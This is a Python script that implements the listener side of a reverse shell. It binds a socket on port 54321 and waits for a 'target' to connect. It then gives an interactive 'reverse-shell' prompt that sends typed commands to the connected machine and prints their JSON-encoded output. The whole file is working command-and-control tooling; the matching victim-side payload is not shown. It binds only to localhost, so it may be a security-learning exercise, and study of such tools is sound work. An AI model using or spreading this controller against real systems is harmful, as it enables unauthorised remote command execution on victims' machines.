#!/usr/bin/python

import socket
import json
import signal
import sys

# Variables
LHOST = "127.0.0.1"
LPORT = 54321


def c_signal(sig, frame):
	print()
	try:
		reliable_send("exit")
		print("Connection Closed!")
	except NameError:
		pass
	s.close()
	sys.exit(0)

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data.encode())

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data += target.recv(1024).decode()
			return json.loads(json_data)
		except ValueError:
			continue

def init_server():
	global s, ip, target

	# Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	# Bind socket
	s.bind((LHOST, LPORT))

	# Number of connections
	s.listen(1)
	print("Listening for Incoming Connections")

	# Accept connection
	target, ip = s.accept()
	print("Target Connected!")

def shell():
	while True:
		# Send/Receive commands
		command = input("reverse-shell@%s:%d:~# " % (ip[0], ip[1]))
		reliable_send(command)
		if(command == "q" or command == "exit"):
			break
		else:
			result = reliable_recv()
			print(result)

# Signal listener
signal.signal(signal.SIGINT, c_signal)

# Functions call
init_server()
shell()

# Close connection
print("Connection Closed!")
s.close()
